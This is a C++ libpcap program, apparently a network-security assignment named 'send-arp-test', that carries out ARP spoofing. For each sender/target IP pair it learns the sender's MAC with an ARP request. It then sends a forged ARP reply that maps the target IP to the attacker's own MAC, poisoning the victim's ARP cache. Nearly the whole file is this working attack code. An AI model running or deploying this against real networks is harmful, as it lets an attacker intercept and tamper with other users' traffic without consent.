#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>

// Convenience types
typedef std::string str;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender IP1> <target IP1> [<sender IP2> <target IP2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.0.1 192.168.0.142 192.168.0.2 192.168.0.143\n");
}

str get_mac_address(const str& iface) {
    int fd;
    struct ifreq ifr;
    char mac_addr[18] = {0};

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);

    sprintf(mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return str(mac_addr);
}

str get_ip_address(const str& iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);

    return inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    std::vector<Ip> sender_ips;
    std::vector<Ip> target_ips;

    for (int i = 2; i < argc; i += 2) {
        sender_ips.push_back(Ip(argv[i]));
        target_ips.push_back(Ip(argv[i + 1]));
    }

    str my_mac_str = get_mac_address(dev);
    str my_ip_str = get_ip_address(dev);

    Mac my_mac(my_mac_str.c_str());
    Ip my_ip(my_ip_str.c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    for (size_t i = 0; i < sender_ips.size(); ++i) {
        EthArpPacket packet;
        packet = EthArpPacket{
            .eth_ = EthHdr{ Mac("ff:ff:ff:ff:ff:ff"), my_mac, htons(EthHdr::Arp) },
            .arp_ = ArpHdr{
                htons(ArpHdr::ETHER),
                htons(EthHdr::Ip4),
                Mac::SIZE,
                Ip::SIZE,
                htons(ArpHdr::Request),
                my_mac,
                htonl(my_ip),
                Mac("00:00:00:00:00:00"),
                htonl(sender_ips[i])
            }
        };

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "Error sending ARP request: %d (%s)\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return -1;
        }
        while (true) {
            struct pcap_pkthdr* header;
            const u_char* recv_packet;
            res = pcap_next_ex(handle, &header, &recv_packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("Error capturing packet: %s\n", pcap_geterr(handle));
                break;
            }

            EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
            if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
                if (recv_etharp->arp_.sip() == sender_ips[i]) {
                    printf("Received ARP reply from sender. Sender's MAC: %s\n", std::string(recv_etharp->eth_.smac()).c_str());
                    packet.eth_.dmac_ = recv_etharp->eth_.smac_;
                    packet.arp_.tmac_ = recv_etharp->eth_.smac_;
                    break;
                }
            }
        }

        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.sip_ = htonl(target_ips[i]);
        packet.arp_.tip_ = htonl(sender_ips[i]);

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "Error sending ARP reply: %d (%s)\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle);
    return 0;
}
